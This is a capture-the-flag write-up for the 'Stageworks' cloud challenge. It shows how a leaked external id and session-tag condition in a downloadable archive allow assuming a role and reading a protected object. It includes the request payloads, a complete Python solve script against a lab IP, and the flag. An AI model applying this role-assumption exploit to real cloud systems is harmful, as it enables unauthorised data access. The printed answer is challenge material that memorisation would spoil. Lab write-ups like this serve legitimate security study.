---
title: "Stageworks"
ctf: "Safaricom CTF"
date: 2026-10-06
category: cloud
difficulty: medium
points: 500
flag_format: "safctf{...}"
author: "Strawhats"
---

# Stageworks

> **Category:** CLOUD · **Points:** 500 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: http://54.72.82.22:8400 (Werkzeug/Flask)

## Recon

Root page lists a "Collection desk" with:
- `GET /downloads/rehearsal.zip`
- `GET /api/identity`
- `POST /api/assume` accepts `role`, `external_id`, `tags`
- `GET /api/object` accepts header `X-Session`

### rehearsal.zip (249 B) contains

`deployment.log`:
```
Lighting integration: externalId=d4a868d5e1dbf4bf89c6c520
```

`policy.json`:
```json
{"trust": {"role": "lighting", "externalId": "integration-value"},
 "object": {"condition": {"sessionTag/department": "finance"}},
 "tagSession": true}
```

This is an AWS STS `AssumeRole` analogue:
- Trust policy: role must be `lighting`, external id must match the deployment log.
- The `object` resource is only readable when the **session tag** `department=finance` is present.
- `tagSession: true` means the tag is passed at assume time and carried by the session.

## Exploit

1. Assume the `lighting` role using the external id leaked in `deployment.log`:
   ```json
   {"role":"lighting","external_id":"d4a868d5e1dbf4bf89c6c520",
    "tags":{"department":"finance"}}
   ```
   -> `{"token":"<36 hex>"}` (session token).

   **Key detail:** `tags` must be a JSON **object/dict** `{"department":"finance"}`, NOT the
   AWS-style list `[{"Key":"department","Value":"finance"}]`. The list form returns a token but
   the session tag is never applied, so the object read fails with HTTP 500 (condition
   evaluation blows up / missing tag). The dict form yields HTTP 200.

2. Use the token on the protected object endpoint:
   ```
   GET /api/object  -H "X-Session: <token>"
   -> {"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
   ```

## Misconfiguration summary

Over-permissive trust policy: the external id was leaked in a downloadable deployment archive,
allowing anyone to assume the `lighting` role and, by supplying the required session tag
(`department=finance`, also leaked in the same archive's policy.json), read the protected
S3-style object that holds the flag.

## Status codes observed

- `X-Session: guest` / missing / invalid token -> 403
- valid token WITHOUT session tag (list-form tags) -> 500
- valid token WITH session tag (dict-form tags) -> 200 + flag

## Solve script

`cloud/stageworks/solve.py`:

```python
#!/usr/bin/env python3
"""
Stageworks (CLOUD, 500 pts) — safctf CTF
Target: http://54.72.82.22:8400

Chain:
  1. Download /downloads/rehearsal.zip -> deployment.log leaks the externalId,
     policy.json leaks the trust role ("lighting") and the required session tag
     (department=finance).
  2. POST /api/assume with role/external_id and tags as a JSON OBJECT (dict) to
     obtain a session token carrying the session tag.
  3. GET /api/object with X-Session: <token> -> flag.

Usage: python3 solve.py [base_url]
"""
import io
import json
import re
import sys
import zipfile

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8400"


def main() -> str:
    s = requests.Session()

    # 1. loot the deployment archive
    r = s.get(f"{BASE}/downloads/rehearsal.zip", timeout=20)
    r.raise_for_status()
    zf = zipfile.ZipFile(io.BytesIO(r.content))

    log = zf.read("deployment.log").decode()
    policy = json.loads(zf.read("policy.json").decode())

    external_id = re.search(r"externalId=([0-9a-f]+)", log).group(1)
    role = policy["trust"]["role"]                       # "lighting"
    # required session tag: {"department": "finance"}
    tag_path, tag_value = next(iter(policy["object"]["condition"].items()))
    tag_key = tag_path.split("/", 1)[1]                  # "department"

    print(f"[*] role={role} external_id={external_id} "
          f"session-tag {tag_key}={tag_value}")

    # 2. assume the role WITH the session tag.
    #    NOTE: tags MUST be a dict; the AWS-style list form yields a token but
    #    drops the session tag, so the object read later 500s.
    r = s.post(
        f"{BASE}/api/assume",
        json={
            "role": role,
            "external_id": external_id,
            "tags": {tag_key: tag_value},
        },
        timeout=20,
    )
    r.raise_for_status()
    token = r.json()["token"]
    print(f"[*] session token: {token}")

    # 3. read the protected object
    r = s.get(f"{BASE}/api/object", headers={"X-Session": token}, timeout=20)
    r.raise_for_status()
    body = r.text
    print(f"[*] /api/object -> {body}")

    m = re.search(r"safctf\{[0-9a-f]{32}\}", body)
    if not m:
        raise SystemExit("flag not found in response")
    return m.group(0)


if __name__ == "__main__":
    flag = main()
    print(f"[+] FLAG: {flag}")
```

## Tools

**Used in this solve:**

- `zipfile`
- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- aws CLI + Pacu (AWS exploitation)
- kubectl (K8s API)
- ScoutSuite / Prowler (posture)
- kube-hunter

## Flag

```
safctf{b9d2678027feea5870c41931b663fd6d}
```
